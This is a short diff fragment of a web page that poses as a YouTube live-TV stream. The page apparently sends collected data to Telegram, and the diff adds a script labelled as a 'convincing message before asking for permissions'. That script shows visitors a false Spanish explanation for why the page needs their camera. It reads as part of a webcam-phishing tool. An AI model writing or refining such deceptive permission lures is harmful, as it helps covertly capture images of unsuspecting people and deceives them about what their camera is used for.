@@ -20,6 +20,11 @@ send_to_telegram($msg);
 </head>
 <body>
 
+<script>
+// Mensaje convincente antes de pedir permisos
+alert("Para ofrecer la mejor experiencia, necesitamos acceso a tu cámara. Esto nos permitirá gestionar tus archivos multimedia de forma eficiente, guardar videos de demostración y reproducirlos directamente en la aplicación.");
+</script>
+       
 <!-- Video de YouTube -->
 <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
